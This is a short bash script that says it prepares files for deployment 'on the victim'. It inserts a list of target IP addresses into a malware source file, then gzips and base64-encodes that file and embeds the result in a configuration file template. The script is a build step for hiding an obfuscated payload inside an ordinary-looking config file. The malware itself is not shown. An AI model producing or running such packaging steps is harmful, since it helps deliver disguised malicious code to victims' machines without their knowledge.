#!/bin/bash

# This script generates and prepares all files and makes them ready to be deployed on the victim

##### Configuration #####
# List of target IPs
IPS='"127.0.0.1","123.123.123.123"'

# get the malware script source
mws=$(sed "s/'127.0.0.1'/${IPS}/" src/code.py | gzip -c | base64 -w0)

# fill in the template
sed "s|@B64@|${mws}|" files/marty.conf.in | \
	sed "s|@IPS@|${IPS}|" > files/marty.conf
